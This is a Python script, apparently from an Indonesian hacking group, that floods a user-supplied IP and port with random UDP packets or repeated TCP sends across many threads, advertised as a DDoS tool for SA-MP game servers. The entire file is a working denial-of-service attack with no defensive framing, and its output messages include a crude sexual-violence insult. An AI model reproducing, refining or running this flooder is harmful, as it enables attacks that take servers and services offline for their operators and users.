#!/usr/bin/env python3
#Yahh Tertangkap gwa
#Manfactured By ZRXY
import random
import socket
import threading
import os
import sys

os.system("clear")

print("""\033[1;31;40m



███████╗░░██╗██╗██╗░░██╗██╗░░░██╗
╚════██║░██╔╝██║╚██╗██╔╝╚██╗░██╔╝
░░███╔═╝██╔╝░██║░╚███╔╝░░╚████╔╝░
██╔══╝░░███████║░██╔██╗░░░╚██╔╝░░
███████╗╚════██║██╔╝╚██╗░░░██║░░░
╚══════╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░
""")

print("--- AUTHOR BY : Z4XY ---")
print("--- TOOLS BY : TEAM SlayerEx ---")
print("--- JANGAN ABUSE KON ---")
print("===================================")
print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
print("========== VERSION 1.0 ============")
ip = str(input(" IP:"))
port = int(input(" Port:"))
choice = str(input(" GASS UDEPEHNYA?(y/n):"))
times = int(input(" Package:"))
threads = int(input(" Threads:"))
def run():
  data = random._urandom(1024)
  i = random.choice(("[]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" MAMAM DI PERKOSA Z4XY")
    except:
      print("DOWN AJG!!")

def run2():
  data = random._urandom(16)
  i = random.choice(("[]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Sent!!!")
    except:
      s.close()
      print("[*] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()